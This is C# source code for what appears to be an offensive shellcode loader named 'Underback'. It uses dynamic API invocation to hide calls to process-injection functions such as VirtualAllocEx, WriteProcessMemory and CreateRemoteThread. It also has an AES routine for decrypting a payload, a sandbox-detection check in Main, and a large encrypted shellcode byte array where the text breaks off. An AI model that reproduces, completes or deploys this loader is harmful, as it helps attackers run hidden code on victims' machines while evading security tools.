using System;
using System.Net;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Text;


namespace Underback
{
    public class DELEGATES
    {
        //DInvoke delegates

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 LdrLoadDll(IntPtr PathToFile, UInt32 dwFlags, ref STRUCTS.UNICODE_STRING ModuleFileName, ref IntPtr ModuleHandle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate void RtlInitUnicodeString(ref STRUCTS.UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr GetCurrentProcess();

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool GetProcessMemoryInfo(IntPtr hProcess, out STRUCTS.PROCESS_MEMORY_COUNTERS counters, uint size);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr CreateMutexA(IntPtr lpMutexAttributes, bool bInitialOwner, string lpName);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate uint ResumeThread(IntPtr hThread);
    }

    public class STRUCTS
    {
        // Structures and Enums 

        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING
        {
            public UInt16 Length;
            public UInt16 MaximumLength;
            public IntPtr Buffer;
        }
        public enum NtStatus : uint
        {
            // Success
            Success = 0x00000000,
            Wait0 = 0x00000000,
            Wait1 = 0x00000001,
            Wait2 = 0x00000002,
            Wait3 = 0x00000003,
            Wait63 = 0x0000003f,
            Abandoned = 0x00000080,
            AbandonedWait0 = 0x00000080,
            AbandonedWait1 = 0x00000081,
            AbandonedWait2 = 0x00000082,
            AbandonedWait3 = 0x00000083,
            AbandonedWait63 = 0x000000bf,
            UserApc = 0x000000c0,
            KernelApc = 0x00000100,
            Alerted = 0x00000101,
            Timeout = 0x00000102,
            Pending = 0x00000103,
            Reparse = 0x00000104,
            MoreEntries = 0x00000105,
            NotAllAssigned = 0x00000106,
            SomeNotMapped = 0x00000107,
            OpLockBreakInProgress = 0x00000108,
            VolumeMounted = 0x00000109,
            RxActCommitted = 0x0000010a,
            NotifyCleanup = 0x0000010b,
            NotifyEnumDir = 0x0000010c,
            NoQuotasForAccount = 0x0000010d,
            PrimaryTransportConnectFailed = 0x0000010e,
            PageFaultTransition = 0x00000110,
            PageFaultDemandZero = 0x00000111,
            PageFaultCopyOnWrite = 0x00000112,
            PageFaultGuardPage = 0x00000113,
            PageFaultPagingFile = 0x00000114,
            CrashDump = 0x00000116,
            ReparseObject = 0x00000118,
            NothingToTerminate = 0x00000122,
            ProcessNotInJob = 0x00000123,
            ProcessInJob = 0x00000124,
            ProcessCloned = 0x00000129,
            FileLockedWithOnlyReaders = 0x0000012a,
            FileLockedWithWriters = 0x0000012b,

            // Informational
            Informational = 0x40000000,
            ObjectNameExists = 0x40000000,
            ThreadWasSuspended = 0x40000001,
            WorkingSetLimitRange = 0x40000002,
            ImageNotAtBase = 0x40000003,
            RegistryRecovered = 0x40000009,

            // Warning
            Warning = 0x80000000,
            GuardPageViolation = 0x80000001,
            DatatypeMisalignment = 0x80000002,
            Breakpoint = 0x80000003,
            SingleStep = 0x80000004,
            BufferOverflow = 0x80000005,
            NoMoreFiles = 0x80000006,
            HandlesClosed = 0x8000000a,
            PartialCopy = 0x8000000d,
            DeviceBusy = 0x80000011,
            InvalidEaName = 0x80000013,
            EaListInconsistent = 0x80000014,
            NoMoreEntries = 0x8000001a,
            LongJump = 0x80000026,
            DllMightBeInsecure = 0x8000002b,

            // Error
            Error = 0xc0000000,
            Unsuccessful = 0xc0000001,
            NotImplemented = 0xc0000002,
            InvalidInfoClass = 0xc0000003,
            InfoLengthMismatch = 0xc0000004,
            AccessViolation = 0xc0000005,
            InPageError = 0xc0000006,
            PagefileQuota = 0xc0000007,
            InvalidHandle = 0xc0000008,
            BadInitialStack = 0xc0000009,
            BadInitialPc = 0xc000000a,
            InvalidCid = 0xc000000b,
            TimerNotCanceled = 0xc000000c,
            InvalidParameter = 0xc000000d,
            NoSuchDevice = 0xc000000e,
            NoSuchFile = 0xc000000f,
            InvalidDeviceRequest = 0xc0000010,
            EndOfFile = 0xc0000011,
            WrongVolume = 0xc0000012,
            NoMediaInDevice = 0xc0000013,
            NoMemory = 0xc0000017,
            NotMappedView = 0xc0000019,
            UnableToFreeVm = 0xc000001a,
            UnableToDeleteSection = 0xc000001b,
            IllegalInstruction = 0xc000001d,
            AlreadyCommitted = 0xc0000021,
            AccessDenied = 0xc0000022,
            BufferTooSmall = 0xc0000023,
            ObjectTypeMismatch = 0xc0000024,
            NonContinuableException = 0xc0000025,
            BadStack = 0xc0000028,
            NotLocked = 0xc000002a,
            NotCommitted = 0xc000002d,
            InvalidParameterMix = 0xc0000030,
            ObjectNameInvalid = 0xc0000033,
            ObjectNameNotFound = 0xc0000034,
            ObjectNameCollision = 0xc0000035,
            ObjectPathInvalid = 0xc0000039,
            ObjectPathNotFound = 0xc000003a,
            ObjectPathSyntaxBad = 0xc000003b,
            DataOverrun = 0xc000003c,
            DataLate = 0xc000003d,
            DataError = 0xc000003e,
            CrcError = 0xc000003f,
            SectionTooBig = 0xc0000040,
            PortConnectionRefused = 0xc0000041,
            InvalidPortHandle = 0xc0000042,
            SharingViolation = 0xc0000043,
            QuotaExceeded = 0xc0000044,
            InvalidPageProtection = 0xc0000045,
            MutantNotOwned = 0xc0000046,
            SemaphoreLimitExceeded = 0xc0000047,
            PortAlreadySet = 0xc0000048,
            SectionNotImage = 0xc0000049,
            SuspendCountExceeded = 0xc000004a,
            ThreadIsTerminating = 0xc000004b,
            BadWorkingSetLimit = 0xc000004c,
            IncompatibleFileMap = 0xc000004d,
            SectionProtection = 0xc000004e,
            EasNotSupported = 0xc000004f,
            EaTooLarge = 0xc0000050,
            NonExistentEaEntry = 0xc0000051,
            NoEasOnFile = 0xc0000052,
            EaCorruptError = 0xc0000053,
            FileLockConflict = 0xc0000054,
            LockNotGranted = 0xc0000055,
            DeletePending = 0xc0000056,
            CtlFileNotSupported = 0xc0000057,
            UnknownRevision = 0xc0000058,
            RevisionMismatch = 0xc0000059,
            InvalidOwner = 0xc000005a,
            InvalidPrimaryGroup = 0xc000005b,
            NoImpersonationToken = 0xc000005c,
            CantDisableMandatory = 0xc000005d,
            NoLogonServers = 0xc000005e,
            NoSuchLogonSession = 0xc000005f,
            NoSuchPrivilege = 0xc0000060,
            PrivilegeNotHeld = 0xc0000061,
            InvalidAccountName = 0xc0000062,
            UserExists = 0xc0000063,
            NoSuchUser = 0xc0000064,
            GroupExists = 0xc0000065,
            NoSuchGroup = 0xc0000066,
            MemberInGroup = 0xc0000067,
            MemberNotInGroup = 0xc0000068,
            LastAdmin = 0xc0000069,
            WrongPassword = 0xc000006a,
            IllFormedPassword = 0xc000006b,
            PasswordRestriction = 0xc000006c,
            LogonFailure = 0xc000006d,
            AccountRestriction = 0xc000006e,
            InvalidLogonHours = 0xc000006f,
            InvalidWorkstation = 0xc0000070,
            PasswordExpired = 0xc0000071,
            AccountDisabled = 0xc0000072,
            NoneMapped = 0xc0000073,
            TooManyLuidsRequested = 0xc0000074,
            LuidsExhausted = 0xc0000075,
            InvalidSubAuthority = 0xc0000076,
            InvalidAcl = 0xc0000077,
            InvalidSid = 0xc0000078,
            InvalidSecurityDescr = 0xc0000079,
            ProcedureNotFound = 0xc000007a,
            InvalidImageFormat = 0xc000007b,
            NoToken = 0xc000007c,
            BadInheritanceAcl = 0xc000007d,
            RangeNotLocked = 0xc000007e,
            DiskFull = 0xc000007f,
            ServerDisabled = 0xc0000080,
            ServerNotDisabled = 0xc0000081,
            TooManyGuidsRequested = 0xc0000082,
            GuidsExhausted = 0xc0000083,
            InvalidIdAuthority = 0xc0000084,
            AgentsExhausted = 0xc0000085,
            InvalidVolumeLabel = 0xc0000086,
            SectionNotExtended = 0xc0000087,
            NotMappedData = 0xc0000088,
            ResourceDataNotFound = 0xc0000089,
            ResourceTypeNotFound = 0xc000008a,
            ResourceNameNotFound = 0xc000008b,
            ArrayBoundsExceeded = 0xc000008c,
            FloatDenormalOperand = 0xc000008d,
            FloatDivideByZero = 0xc000008e,
            FloatInexactResult = 0xc000008f,
            FloatInvalidOperation = 0xc0000090,
            FloatOverflow = 0xc0000091,
            FloatStackCheck = 0xc0000092,
            FloatUnderflow = 0xc0000093,
            IntegerDivideByZero = 0xc0000094,
            IntegerOverflow = 0xc0000095,
            PrivilegedInstruction = 0xc0000096,
            TooManyPagingFiles = 0xc0000097,
            FileInvalid = 0xc0000098,
            InstanceNotAvailable = 0xc00000ab,
            PipeNotAvailable = 0xc00000ac,
            InvalidPipeState = 0xc00000ad,
            PipeBusy = 0xc00000ae,
            IllegalFunction = 0xc00000af,
            PipeDisconnected = 0xc00000b0,
            PipeClosing = 0xc00000b1,
            PipeConnected = 0xc00000b2,
            PipeListening = 0xc00000b3,
            InvalidReadMode = 0xc00000b4,
            IoTimeout = 0xc00000b5,
            FileForcedClosed = 0xc00000b6,
            ProfilingNotStarted = 0xc00000b7,
            ProfilingNotStopped = 0xc00000b8,
            NotSameDevice = 0xc00000d4,
            FileRenamed = 0xc00000d5,
            CantWait = 0xc00000d8,
            PipeEmpty = 0xc00000d9,
            CantTerminateSelf = 0xc00000db,
            InternalError = 0xc00000e5,
            InvalidParameter1 = 0xc00000ef,
            InvalidParameter2 = 0xc00000f0,
            InvalidParameter3 = 0xc00000f1,
            InvalidParameter4 = 0xc00000f2,
            InvalidParameter5 = 0xc00000f3,
            InvalidParameter6 = 0xc00000f4,
            InvalidParameter7 = 0xc00000f5,
            InvalidParameter8 = 0xc00000f6,
            InvalidParameter9 = 0xc00000f7,
            InvalidParameter10 = 0xc00000f8,
            InvalidParameter11 = 0xc00000f9,
            InvalidParameter12 = 0xc00000fa,
            MappedFileSizeZero = 0xc000011e,
            TooManyOpenedFiles = 0xc000011f,
            Cancelled = 0xc0000120,
            CannotDelete = 0xc0000121,
            InvalidComputerName = 0xc0000122,
            FileDeleted = 0xc0000123,
            SpecialAccount = 0xc0000124,
            SpecialGroup = 0xc0000125,
            SpecialUser = 0xc0000126,
            MembersPrimaryGroup = 0xc0000127,
            FileClosed = 0xc0000128,
            TooManyThreads = 0xc0000129,
            ThreadNotInProcess = 0xc000012a,
            TokenAlreadyInUse = 0xc000012b,
            PagefileQuotaExceeded = 0xc000012c,
            CommitmentLimit = 0xc000012d,
            InvalidImageLeFormat = 0xc000012e,
            InvalidImageNotMz = 0xc000012f,
            InvalidImageProtect = 0xc0000130,
            InvalidImageWin16 = 0xc0000131,
            LogonServer = 0xc0000132,
            DifferenceAtDc = 0xc0000133,
            SynchronizationRequired = 0xc0000134,
            DllNotFound = 0xc0000135,
            IoPrivilegeFailed = 0xc0000137,
            OrdinalNotFound = 0xc0000138,
            EntryPointNotFound = 0xc0000139,
            ControlCExit = 0xc000013a,
            PortNotSet = 0xc0000353,
            DebuggerInactive = 0xc0000354,
            CallbackBypass = 0xc0000503,
            PortClosed = 0xc0000700,
            MessageLost = 0xc0000701,
            InvalidMessage = 0xc0000702,
            RequestCanceled = 0xc0000703,
            RecursiveDispatch = 0xc0000704,
            LpcReceiveBufferExpected = 0xc0000705,
            LpcInvalidConnectionUsage = 0xc0000706,
            LpcRequestsNotAllowed = 0xc0000707,
            ResourceInUse = 0xc0000708,
            ProcessIsProtected = 0xc0000712,
            VolumeDirty = 0xc0000806,
            FileCheckedOut = 0xc0000901,
            CheckOutRequired = 0xc0000902,
            BadFileType = 0xc0000903,
            FileTooLarge = 0xc0000904,
            FormsAuthRequired = 0xc0000905,
            VirusInfected = 0xc0000906,
            VirusDeleted = 0xc0000907,
            TransactionalConflict = 0xc0190001,
            InvalidTransaction = 0xc0190002,
            TransactionNotActive = 0xc0190003,
            TmInitializationFailed = 0xc0190004,
            RmNotActive = 0xc0190005,
            RmMetadataCorrupt = 0xc0190006,
            TransactionNotJoined = 0xc0190007,
            DirectoryNotRm = 0xc0190008,
            CouldNotResizeLog = 0xc0190009,
            TransactionsUnsupportedRemote = 0xc019000a,
            LogResizeInvalidSize = 0xc019000b,
            RemoteFileVersionMismatch = 0xc019000c,
            CrmProtocolAlreadyExists = 0xc019000f,
            TransactionPropagationFailed = 0xc0190010,
            CrmProtocolNotFound = 0xc0190011,
            TransactionSuperiorExists = 0xc0190012,
            TransactionRequestNotValid = 0xc0190013,
            TransactionNotRequested = 0xc0190014,
            TransactionAlreadyAborted = 0xc0190015,
            TransactionAlreadyCommitted = 0xc0190016,
            TransactionInvalidMarshallBuffer = 0xc0190017,
            CurrentTransactionNotValid = 0xc0190018,
            LogGrowthFailed = 0xc0190019,
            ObjectNoLongerExists = 0xc0190021,
            StreamMiniversionNotFound = 0xc0190022,
            StreamMiniversionNotValid = 0xc0190023,
            MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
            CantOpenMiniversionWithModifyIntent = 0xc0190025,
            CantCreateMoreStreamMiniversions = 0xc0190026,
            HandleNoLongerValid = 0xc0190028,
            NoTxfMetadata = 0xc0190029,
            LogCorruptionDetected = 0xc0190030,
            CantRecoverWithHandleOpen = 0xc0190031,
            RmDisconnected = 0xc0190032,
            EnlistmentNotSuperior = 0xc0190033,
            RecoveryNotNeeded = 0xc0190034,
            RmAlreadyStarted = 0xc0190035,
            FileIdentityNotPersistent = 0xc0190036,
            CantBreakTransactionalDependency = 0xc0190037,
            CantCrossRmBoundary = 0xc0190038,
            TxfDirNotEmpty = 0xc0190039,
            IndoubtTransactionsExist = 0xc019003a,
            TmVolatile = 0xc019003b,
            RollbackTimerExpired = 0xc019003c,
            TxfAttributeCorrupt = 0xc019003d,
            EfsNotAllowedInTransaction = 0xc019003e,
            TransactionalOpenNotAllowed = 0xc019003f,
            TransactedMappingUnsupportedRemote = 0xc0190040,
            TxfMetadataAlreadyPresent = 0xc0190041,
            TransactionScopeCallbacksNotSet = 0xc0190042,
            TransactionRequiredPromotion = 0xc0190043,
            CannotExecuteFileInTransaction = 0xc0190044,
            TransactionsNotFrozen = 0xc0190045,

            MaximumNtStatus = 0xffffffff
        }

        [StructLayout(LayoutKind.Sequential, Size = 40)]
        public struct PROCESS_MEMORY_COUNTERS
        {
            public uint cb;
            public uint PageFaultCount;
            public uint PeakWorkingSetSize;
            public uint WorkingSetSize;
            public uint QuotaPeakPagedPoolUsage;
            public uint QuotaPagedPoolUsage;
            public uint QuotaPeakNonPagedPoolUsage;
            public uint QuotaNonPagedPoolUsage;
            public uint PagefileUsage;
            public uint PeakPagefileUsage;
        }
    }

    public class Invoke
    {
        //Dinvoke core
        public static STRUCTS.NtStatus LdrLoadDll(IntPtr PathToFile, UInt32 dwFlags, ref STRUCTS.UNICODE_STRING ModuleFileName, ref IntPtr ModuleHandle)
        {
            // Craft an array for the arguments
            object[] funcargs =
            {
                PathToFile, dwFlags, ModuleFileName, ModuleHandle
            };

            STRUCTS.NtStatus retValue = (STRUCTS.NtStatus)DynamicAPIInvoke(@"ntdll.dll", @"LdrLoadDll", typeof(DELEGATES.LdrLoadDll), ref funcargs);

            // Update the modified variables
            ModuleHandle = (IntPtr)funcargs[3];

            return retValue;
        }
        /// <summary>
        /// Helper for getting the base address of a module loaded by the current process. This base
        /// address could be passed to GetProcAddress/LdrGetProcedureAddress or it could be used for
        /// manual export parsing. This function uses the .NET System.Diagnostics.Process class.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="DLLName">The name of the DLL (e.g. "ntdll.dll").</param>
        /// <returns>IntPtr base address of the loaded module or IntPtr.Zero if the module is not found.</returns>
        public static IntPtr GetLoadedModuleAddress(string DLLName)
        {
            ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
            foreach (ProcessModule Mod in ProcModules)
            {
                if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
                {
                    return Mod.BaseAddress;
                }
            }
            return IntPtr.Zero;
        }

        public static void RtlInitUnicodeString(ref STRUCTS.UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString)
        {
            // Craft an array for the arguments
            object[] funcargs =
            {
                DestinationString, SourceString
            };

            DynamicAPIInvoke(@"ntdll.dll", @"RtlInitUnicodeString", typeof(DELEGATES.RtlInitUnicodeString), ref funcargs);

            // Update the modified variables
            DestinationString = (STRUCTS.UNICODE_STRING)funcargs[0];
        }

        /// <summary>
        /// Resolves LdrLoadDll and uses that function to load a DLL from disk.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="DLLPath">The path to the DLL on disk. Uses the LoadLibrary convention.</param>
        /// <returns>IntPtr base address of the loaded module or IntPtr.Zero if the module was not loaded successfully.</returns>
        public static IntPtr LoadModuleFromDisk(string DLLPath)
        {
            STRUCTS.UNICODE_STRING uModuleName = new STRUCTS.UNICODE_STRING();
            RtlInitUnicodeString(ref uModuleName, DLLPath);

            IntPtr hModule = IntPtr.Zero;
            STRUCTS.NtStatus CallResult = LdrLoadDll(IntPtr.Zero, 0, ref uModuleName, ref hModule);
            if (CallResult != STRUCTS.NtStatus.Success || hModule == IntPtr.Zero)
            {
                return IntPtr.Zero;
            }

            return hModule;
        }

        /// <summary>
        /// Dynamically invoke an arbitrary function from a DLL, providing its name, function prototype, and arguments.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="DLLName">Name of the DLL.</param>
        /// <param name="FunctionName">Name of the function.</param>
        /// <param name="FunctionDelegateType">Prototype for the function, represented as a Delegate object.</param>
        /// <param name="Parameters">Parameters to pass to the function. Can be modified if function uses call by reference.</param>
        /// <returns>Object returned by the function. Must be unmarshalled by the caller.</returns>
        public static object DynamicAPIInvoke(string DLLName, string FunctionName, Type FunctionDelegateType, ref object[] Parameters)
        {
            IntPtr pFunction = GetLibraryAddress(DLLName, FunctionName);
            return DynamicFunctionInvoke(pFunction, FunctionDelegateType, ref Parameters);
        }

        /// <summary>
        /// Dynamically invokes an arbitrary function from a pointer. Useful for manually mapped modules or loading/invoking unmanaged code from memory.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="FunctionPointer">A pointer to the unmanaged function.</param>
        /// <param name="FunctionDelegateType">Prototype for the function, represented as a Delegate object.</param>
        /// <param name="Parameters">Arbitrary set of parameters to pass to the function. Can be modified if function uses call by reference.</param>
        /// <returns>Object returned by the function. Must be unmarshalled by the caller.</returns>
        public static object DynamicFunctionInvoke(IntPtr FunctionPointer, Type FunctionDelegateType, ref object[] Parameters)
        {
            Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(FunctionPointer, FunctionDelegateType);
            return funcDelegate.DynamicInvoke(Parameters);
        }

        /// <summary>
        /// Given a module base address, resolve the address of a function by manually walking the module export table.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="ModuleBase">A pointer to the base address where the module is loaded in the current process.</param>
        /// <param name="ExportName">The name of the export to search for (e.g. "NtAlertResumeThread").</param>
        /// <returns>IntPtr for the desired function.</returns>
        public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
        {
            IntPtr FunctionPtr = IntPtr.Zero;
            try
            {
                // Traverse the PE header in memory
                Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
                Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
                Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
                Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
                Int64 pExport = 0;
                if (Magic == 0x010b)
                {
                    pExport = OptHeader + 0x60;
                }
                else
                {
                    pExport = OptHeader + 0x70;
                }

                // Read -> IMAGE_EXPORT_DIRECTORY
                Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
                Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
                Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
                Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
                Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
                Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
                Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

                // Loop the array of export name RVA
                for (int i = 0; i < NumberOfNames; i++)
                {
                    string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                    if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                    {
                        Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                        Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                        FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                        break;
                    }
                }
            }
            catch
            {
                // Catch parser failure
                throw new InvalidOperationException("Failed to parse module exports.");
            }

            if (FunctionPtr == IntPtr.Zero)
            {
                // Export not found
                throw new MissingMethodException(ExportName + ", export not found.");
            }
            return FunctionPtr;
        }

        /// <summary>
        /// Helper for getting the pointer to a function from a DLL loaded by the process.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="DLLName">The name of the DLL (e.g. "ntdll.dll" or "C:\Windows\System32\ntdll.dll").</param>
        /// <param name="FunctionName">Name of the exported procedure.</param>
        /// <param name="CanLoadFromDisk">Optional, indicates if the function can try to load the DLL from disk if it is not found in the loaded module list.</param>
        /// <returns>IntPtr for the desired function.</returns>
        public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false)
        {
            IntPtr hModule = GetLoadedModuleAddress(DLLName);
            if (hModule == IntPtr.Zero && CanLoadFromDisk)
            {
                hModule = LoadModuleFromDisk(DLLName);
                if (hModule == IntPtr.Zero)
                {
                    throw new FileNotFoundException(DLLName + ", unable to find the specified file.");
                }
            }
            else if (hModule == IntPtr.Zero)
            {
                throw new DllNotFoundException(DLLName + ", Dll was not found.");
            }

            return GetExportAddress(hModule, FunctionName);
        }
    }
    public static class Funk
    {
        private static T[] SubArray<T>(this T[] data, int index, int length)
        {
            T[] result = new T[length];
            Array.Copy(data, index, result, 0, length);
            return result;
        }

        //--------------------------------------------------------------------------------------------------
        // Decrypts the given a plaintext message byte array with a given 128 bits key
        // Returns the unencrypted message
        //--------------------------------------------------------------------------------------------------
        private static byte[] aesDecrypt(byte[] cipher, byte[] key)
        {
            var IV = cipher.SubArray(0, 16);
            //var encryptedMessage = cipher.SubArray(16, cipher.Length - 16);

            // Create an AesManaged object with the specified key and IV.
            using (AesManaged aes = new AesManaged())
            {
                aes.Padding = PaddingMode.Zeros;
                aes.KeySize = 128;
                aes.Key = key;
                aes.IV = IV;
                aes.Mode = CipherMode.ECB;

                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(cipher, 0, cipher.Length);
                    }

                    return ms.ToArray();
                }
            }
        }


        public static void Main(string[] args)
        {
            // If the app can open a system process, it probably means that we are probably in a sandbox
            IntPtr pointer = Invoke.GetLibraryAddress("kernel32.dll", "OpenProcess");
            DELEGATES.OpenProcess opr = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.OpenProcess)) as DELEGATES.OpenProcess;

            byte[] buf = new byte[1408] {
0x7d,0x58,0x81,0x36,0x3a,0xeb,0x20,0x13,0x79,0xad,0x51,0x5c,0xd1,0x61,0xfc,0x49,0x45,0x23,0x47,0x68,
0x0e,0xec,0xde,0x13,0xc4,0x68,0x8c,0x29,0xd7,0xd3,0x85,0xd4,0x1b,0x88,0x00,0x69,0x6e,0xe6,0x89,0x93,
0x57,0xb7,0x54,0x7f,0x84,0xe2,0xd4,0x19,0xe5,0xe2,0x73,0x6e,0x8f,0x13,0xc0,0x74,0xe9,0x5f,0xcb,0x46,
0x0c,0xbc,0x58,0x7e,0xb8,0xa8,0xf0,0xed,0x98,0x76,0x6a,0xa4,0xce,0xef,0xf1,0x89,0x8d,0xe9,0x00,0x18,
0x97,0xd3,0xd8,0x84,0x97,0x49,0x9d,0x7e,0xd2,0x3f,0xc7,0x19,0xc3,0x12,0x76,0xc7,0x88,0x84,0x5b,0x4a,
0x70,0x08,0x6b,0x67,0xc8,0x53,0x99,0x96,0x3b,0xa4,0xb2,0x65,0x24,0x0e,0xb0,0x71,0x34,0x9a,0x49,0xfe,
0x4d,0xe3,0xef,0xff,0x26,0x91,0xe5,0x32,0x59,0x48,0x6d,0x05,0x09,0x0e,0x29,0x62,0x1c,0x00,0xf8,0xd2,
0x73,0x75,0xea,0xc1,0x7b,0x98,0xa9,0xb1,0xe9,0x77,0x9a,0x78,0x94,0x25,0x62,0x6f,0xb7,0xd6,0x84,0xfc,
0xff,0xa8,0x42,0x12,0x68,0xaa,0x1b,0x7f,0xd6,0x1e,0x7d,0x4a,0xd4,0x55,0x12,0x82,0xbb,0xc2,0x5f,0x78,
0xb8,0x3e,0x42,0x6b,0xe7,0x7b,0xa6,0x9a,0x0d,0x03,0xb6,0x5c,0xba,0x9c,0xdc,0x7e,0x31,0x67,0x85,0xd7,
0x50,0xd4,0x60,0x12,0x0a,0x19,0xba,0x51,0x4c,0x9e,0xe0,0x32,0xf3,0x1e,0x0c,0xdb,0x18,0xd5,0xaa,0x28,
0x7e,0xa7,0xfa,0x50,0x8a,0x69,0x7f,0x04,0x96,0xa5,0x58,0x79,0xff,0xf8,0xf6,0x0d,0xc1,0xa4,0x5a,0xb6,
0xff,0xc0,0xa5,0xb1,0xde,0xcf,0x70,0xc2,0xea,0xf1,0x67,0x00,0xb1,0x60,0xf8,0x02,0xcb,0xaf,0xc0,0x9c,
0xbd,0x5a,0x91,0xea,0x51,0x05,0xbd,0x84,0x14,0xef,0x60,0x25,0x7e,0x73,0xf6,0x85,0xa1,0xf8,0xbe,0x95,
0x8f,0x44,0xf8,0xc7,0x70,0x24,0x73,0xa9,0xd1,0x7d,0x55,0xd0,0xf2,0x3d,0x1e,0xe2,0x60,0x5a,0xed,0x66,
0x22,0x6d,0xc1,0xd7,0x05,0x3f,0xb7,0xc2,0x3a,0x0c,0x1d,0xc4,0xae,0x83,0x1e,0x72,0x0b,0x0b,0x1f,0xed,
0xa4,0x15,0xed,0xbe,0xbb,0x10,0x8a,0xc2,0x4c,0x27,0xb7,0x54,0x41,0x90,0xc3,0xaa,0x1e,0xd2,0xb4,0xfd,
0xac,0xdc,0x66,0xfc,0x17,0x8d,0x80,0xf7,0xbb,0x4a,0xc0,0xf9,0x44,0x10,0x70,0xb9,0x48,0x25,0x5d,0xc2,
0xa4,0x01,0x49,0xb7,0x20,0x01,0x49,0x5d,0x43,0xf4,0xf0,0x7a,0xb0,0x92,0xc5,0x60,0x73,0x37,0x15,0xf8,
0x93,0xc1,0x3d,0x3d,0x06,0xf6,0x72,0x4b,0x6d,0x91,0x38,0x93,0x1f,0xdd,0xb1,0xcc,0x21,0x2f,0x51,0xbd,
0x7d,0x1f,0x6c,0x4f,0x38,0xdd,0x55,0x52,0xb7,0xf0,0xfd,0xd4,0x9b,0x46,0x6f,0xb0,0x2a,0x8d,0x70,0x74,
0xb7,0x61,0xa9,0x87,0x55,0x68,0xd6,0xf1,0x89,0x14,0xd4,0xf7,0x5a,0x2e,0xc7,0x29,0x2e,0x89,0x43,0xea,
0x04,0xa5,0xe8,0x44,0x2d,0x0e,0x99,0xf6,0x30,0xc8,0xa4,0x72,0xd1,0xc1,0xca,0x76,0x68,0xac,0x2c,0x9a,
0xf9,0x85,0xa4,0xe6,0x73,0x7b,0xb9,0x6f,0xce,0x26,0x2b,0xd7,0x54,0x75,0x2d,0x84,0x62,0x67,0x0d,0xb9,
0xe8,0xb4,0xd5,0x91,0xaf,0xda,0x0b,0x87,0x99,0x0f,0xa7,0xf9,0x95,0xd3,0x71,0xde,0x36,0x03,0x5d,0x1d,
